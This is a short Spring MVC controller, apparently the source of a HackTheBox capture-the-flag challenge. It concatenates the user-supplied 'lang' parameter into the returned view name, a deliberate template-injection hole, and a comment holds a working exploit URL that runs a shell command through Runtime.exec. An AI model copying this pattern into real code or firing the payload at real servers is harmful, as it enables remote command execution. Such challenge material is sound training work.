package com.hackthebox.breathtaking_view.Controllers;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.servlet.http.HttpSession;

@Controller
public class IndexController {
    @GetMapping("/")
    public String index(@RequestParam(defaultValue = "en") String lang, HttpSession session, RedirectAttributes redirectAttributes) {
        if (session.getAttribute("user") == null) {
            return "redirect:/login";
        }
        
        /*if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }*/
        // http://192.168.159.130:1337/?lang=;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22ping%20-c%201%20172.17.0.1%22)%7D__::main.x
        return lang + "/index";
    }
}
